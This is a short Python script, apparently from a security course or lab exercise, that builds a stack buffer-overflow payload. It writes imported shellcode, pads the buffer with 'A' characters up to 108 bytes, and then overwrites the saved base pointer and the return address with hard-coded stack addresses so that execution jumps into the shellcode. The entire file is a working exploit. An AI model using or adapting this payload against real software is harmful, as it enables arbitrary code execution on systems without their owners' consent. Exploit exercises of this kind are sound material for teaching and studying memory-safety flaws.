from shellcode import shellcode
import sys
from struct import pack
sys.stdout.buffer.write(shellcode)

print("A" * (108 - len(shellcode)), flush=True, end='')	# filling the rest of the buffer with A(buffer overflow)
sys.stdout.buffer.write(pack("<I",0xfffe9038))		# ebp
sys.stdout.buffer.write(pack("<I",0xfffe9038 - 0x6C))	# address to the start of the shellcode

